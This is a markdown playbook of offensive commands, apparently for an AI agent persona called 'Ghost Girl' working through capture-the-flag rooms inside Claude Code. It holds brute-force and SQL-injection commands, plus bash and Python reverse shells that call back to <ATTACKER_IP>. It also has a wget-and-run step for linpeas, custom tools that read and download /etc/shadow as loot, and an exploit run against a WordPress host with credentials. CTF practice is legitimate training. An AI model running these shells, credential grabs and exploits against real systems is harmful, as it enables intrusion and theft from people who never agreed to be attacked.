# Tool Playbooks

Quick reference for Ghost Girl's preferred tool usage. Not exhaustive — these are the go-to flags and patterns. Adapt as needed.

## Nmap

**Quick scan (first thing to run):**
```bash
nmap -sC -sV -oN nmap-initial.txt <IP>
```
- `-sC`: default scripts
- `-sV`: version detection
- `-oN`: save output

**Full port scan:**
```bash
nmap -p- -T4 -oN nmap-full.txt <IP>
```

**UDP scan:**
```bash
nmap -sU --top-ports 50 -oN nmap-udp.txt <IP>
```

**Targeted script scan:**
```bash
nmap -p <PORT> --script=<category> -oN nmap-scripts.txt <IP>
```

## Gobuster

**Directory bruteforce:**
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
```

**With extensions:**
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -o gobuster.txt
```

**DNS subdomain:**
```bash
gobuster dns -d <DOMAIN> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**VHOST enumeration:**
```bash
gobuster vhost -u http://<IP> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

## Nikto

```bash
nikto -h http://<IP> -o nikto.txt
```

## Hydra

**SSH bruteforce:**
```bash
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

**HTTP POST form:**
```bash
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

## SQLMap

**Basic test:**
```bash
sqlmap -u "http://<IP>/page?param=value" --batch
```

**With forms:**
```bash
sqlmap -u "http://<IP>/page" --forms --batch --dbs
```

## John the Ripper

**Crack hash:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Show cracked:**
```bash
john --show hash.txt
```

## Hashcat

**Identify hash type first:**
```bash
hashid <hash>
```

**Crack:**
```bash
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
```

## Searchsploit

```bash
searchsploit <service> <version>
```

**Mirror exploit to current dir:**
```bash
searchsploit -m <exploit-id>
```

## Reverse Shells

**Bash:**
```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

**Python:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Netcat listener:**
```bash
nc -lvnp <PORT>
```

**Shell stabilization:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## LinPEAS / WinPEAS

**Serve from attacker:**
```bash
python3 -m http.server 8000
```

**Download and run on target:**
```bash
wget http://<ATTACKER_IP>:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee linpeas-output.txt
```

## Useful Wordlists

- `/usr/share/wordlists/rockyou.txt` — passwords
- `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` — directories
- `/usr/share/wordlists/seclists/` — everything else (if installed)

---

## Ghost Tool Suite

Custom tools that replace manual workflows and work within Claude Code's non-interactive terminal.

### ghost-recon.sh — Session Setup & Auto-Recon

**Start a new engagement:**
```bash
bash tools/ghost-recon.sh <TARGET_IP> <ROOM_NAME> --hostname <HOST>
```
- Creates session directory + session.md
- Adds hostname to /etc/hosts
- Runs initial nmap (-sC -sV) and full scan (-p-) in background
- Outputs `[DATA]` lines: SESSION_DIR, TARGET_IP, ATTACK_IP, OPEN_PORTS

### ghost-listen.py — Reverse Shell Handler

Daemon/client architecture — daemon persists the TCP connection, clients are stateless.

**Start daemon:**
```bash
python3 tools/ghost-listen.py --lport 4444 &
```

**Run commands on target:**
```bash
python3 tools/ghost-listen.py --cmd "whoami"
python3 tools/ghost-listen.py --cmd "cat /etc/passwd"
python3 tools/ghost-listen.py --cmd "cat /etc/shadow" --timeout 10
```

**File transfer:**
```bash
python3 tools/ghost-listen.py --upload linpeas.sh --dest /tmp/linpeas.sh
python3 tools/ghost-listen.py --download /etc/shadow --output loot/shadow
```

**Status & control:**
```bash
python3 tools/ghost-listen.py --status
python3 tools/ghost-listen.py --shutdown
```

### ghost-exploit.py — Exploit Framework

**List available exploits:**
```bash
python3 tools/ghost-exploit.py --list
```

**Show exploit options:**
```bash
python3 tools/ghost-exploit.py <module> --info
```

**Check vulnerability:**
```bash
python3 tools/ghost-exploit.py <module> --check --RHOST target.thm --USERNAME user --PASSWORD pass
```

**Run exploit:**
```bash
python3 tools/ghost-exploit.py wp_crop_rce --RHOST blog.thm --USERNAME kwheel --PASSWORD cutiepie1 --LHOST 10.x.x.x --LPORT 4444
```

### ghost-enum.py — Post-Exploitation Enumeration

**Via active shell (ghost-listen daemon must be running):**
```bash
python3 tools/ghost-enum.py
python3 tools/ghost-enum.py --save sessions/room/enum-raw.txt
```

**Via SSH:**
```bash
python3 tools/ghost-enum.py --ssh user:password@host
```

**Parse saved output:**
```bash
python3 tools/ghost-enum.py --parse enum-output.txt
```

Highlights: SUID GTFOBins matches, sudo NOPASSWD entries, dangerous capabilities, writable cron jobs, SSH keys, config files.
